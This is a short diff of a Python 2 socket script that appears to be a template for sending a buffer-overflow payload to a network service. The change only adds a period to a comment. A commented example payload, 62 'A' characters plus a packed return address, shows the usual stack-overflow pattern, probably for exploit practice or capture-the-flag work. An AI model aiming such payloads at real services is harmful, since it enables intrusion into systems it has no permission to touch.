@@ -14,7 +14,7 @@ s.connect(("address",port_number )) #address and port number
 answer = s.recv(1024)
 print answer
 
-# Send stuff. REMEMBER THE \r\n
+# Send stuff. REMEMBER THE \r\n.
 payload = #insert payload here 	#Example of payload 'A'*62 + '\x82\x91\x04\x08'  		
 s.send(payload +'\n')
 print s.recv(1024)
